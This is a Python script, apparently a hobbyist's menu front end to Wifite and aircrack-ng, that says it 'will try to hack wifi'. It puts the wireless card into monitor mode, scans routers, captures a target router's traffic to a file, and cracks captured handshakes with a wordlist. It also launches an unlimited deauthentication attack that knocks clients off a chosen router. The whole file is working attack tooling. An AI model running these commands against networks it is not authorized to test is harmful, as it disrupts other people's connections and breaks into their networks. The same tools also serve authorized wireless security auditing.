#!/usr/bin/env python3

import subprocess
import os
import time
from colorama import init,Fore,Back,Style
import shlex
#--------------------------------------importing----------------------------------------------------------

init(autoreset=True)
wifite_dir="/home/dir/wifite2"


def exit_now(n=0.84):
    clear(1)
    print(f"exiting in {n}")
    exit()
def clear(n=0.35):
    time.sleep(n)
    os.system("clear")
def wifite():
    print("\n\n")
    subprocess.run(["sudo","python3","Wifite.py"])
def airmon(c2):
        if c2 == "1":
            subprocess.run(["sudo" ,"airmon-ng", "start", "wlan0"],stdout=subprocess.DEVNULL)
            print(Fore.BLACK+Back.YELLOW+"Monitor Mode Running on wlan0mon".center(80))
        if c2 == "2":
            subprocess.run(["sudo" ,"airmon-ng", "stop", "wlan0mon"],stdout=subprocess.DEVNULL)
            print(Fore.GREEN+Back.WHITE+"Monitor Mode Stopped  on wlan0mon".center(82))
        if c2 =="3":
            device=subprocess.Popen(["sudo" , "/usr/local/sbin/airmon-ng"],stdout=subprocess.PIPE)
            device_name=device.communicate()[0].decode().split()

            print(Fore.RED+Style.BRIGHT+f"The driver name is {device_name[5]} ".center(82))

def aireplay():
    clear(0)
    print(Fore.BLUE+Style.BRIGHT+"Please Enter Bssid of router")
    Bssid=input("[#>>]")
    if Bssid =="":
        aireplay()
    else:
        try:
            subprocess.run(shlex.split(f"sudo aireplay-ng --deauth 0 -a {Bssid} wlan0mon"),stdin=subprocess.PIPE,check=True)
        except KeyboardInterrupt:
            pass


def aircrack():
    clear(1)
    print("Please Enter the name of the cap file you want to crack")
    cap_name=input("[#>>>]")
    print(Fore.GREEN+cap_name)
    print("Please enter the path of wordlist")
    wordlist=input("[#>>]")
    air=subprocess.run(["sudo","aircrack-ng",f"{cap_name}","-w",f"{wordlist}"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,text=True)



def airodump(c3):
    clear(3)
    print(Fore.RED+Style.BRIGHT+Back.GREEN+"Scan for wireless adapter".center(80))
    print(Style.BRIGHT+"[1]>>Scan  all 2.4ghz routers\n[2]>>Monitor a specific router")
    c3=input("##>>")
    if c3 =="1":
        print("scanning all routers")
        clear(1)
        dump_file=subprocess.Popen(["sudo", "airodump-ng" ,"wlan0mon"],stdout=subprocess.PIPE,stdin=subprocess.PIPE,universal_newlines=True)
        try:
           for data in dump_file.stdout:
              print(data,end="")
        except KeyboardInterrupt:
            print("Exiting if you want")
            os.system('echo -en "\e[?25h"')

    elif c3=="2":
        clear(n=0.35)
        print("Enter the Bssid following  '20:20:20:20:20'")
        Bssid=input("[#>>>>]")
        print("Please enter the channel no ")
        channel=int(input("[#>>>]"))
        print("Please enter the name of file to save ")
        dname=input("Enter name of the file to save it")
        airodump_sp=shlex.split(f"sudo airodump-ng  --bssid {Bssid} --channel {channel}  --write {dname} wlan0mon")
        dump_file_save=subprocess.Popen(airodump_sp,stdin=subprocess.PIPE,stdout=subprocess.PIPE,universal_newlines=True)
        try:
            for file  in dump_file_save.stdout:
              print(file,end="")
        except KeyboardInterrupt:
            print("KeyboardInterrupt")



def main():

    print(Fore.RED+Style.BRIGHT+"What would you like to use::\n\n[1]:Wifite\n\n[2]:Aircrack-suite\n\n[3]:Exit\n\n")

    c1=input("[#>>>]")
    if c1=="exit" or c1=="Exit" or c1 =="EXIT":
        exit_now(0)
    elif c1=="1":
        if not dir==wifite_dir:
            os.chdir(wifite_dir)
            wifite()
        else:
            exit_now()
    elif c1 =="2":
        clear(1)
        print(Fore.BLUE+Style.BRIGHT+'''Please choose and option \n\n[1]>>Start Monitor Mode\n\n[2]>>Stop Monitor Mode\n\n[3]>>Check interface name\n\n[4]>>Go to airodump \n\n[5]>>Go to aircrack\n\n[6]>>Go to aireplay'''.center(85))
        choice=input("[#>>>>]")
        if choice =="1" or choice =="2" or choice =="3":
            airmon(choice)
        elif choice =="4":
            airodump(choice)
        elif choice =="5":
            aircrack()
        elif choice =="6":
            aireplay()
        else:
            print("something wrong")
            exit_now()
    else:
        exit_now()
        print(exit)
#--------------------------------------------------------------------------------------------------------
if __name__=="__main__":
    dir=os.getcwd()
    clear()
    print("\n\nThis script will try to hack wifi using aircrack-ng\n\n".center(82))
    input(Fore.BLUE+Style.BRIGHT+"Press any key to start".center(80))
    while True:

         clear(0.80)
         main()
#done
